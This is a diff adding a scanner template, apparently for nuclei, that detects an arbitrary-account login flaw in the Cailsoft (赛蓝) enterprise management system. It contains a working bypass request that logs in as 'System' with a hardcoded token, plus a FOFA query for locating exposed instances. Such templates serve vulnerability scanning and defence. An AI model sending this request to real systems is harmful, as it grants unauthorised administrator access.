@@ -1,0 +1,28 @@
+id: cailsoft-authtoken-any-user-login
+
+info:
+  name: 赛蓝企业管理系统 AuthToken 任意账号登录
+  author: qwtd
+  severity: high
+  description: 赛蓝企业管理系统AuthToken接口存在任意账号登录漏洞，该漏洞可直接登录后台。
+  metadata:
+    fofa-query: body="www.cailsoft.com"||body="赛蓝企业管理系统"
+  tags: 赛蓝企业管理系统
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        GET /AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f HTTP/1.1
+        Host: {{Hostname}}
+
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "/Home6/AdminPretty"
+      - type: status
+        status:
+          - 302
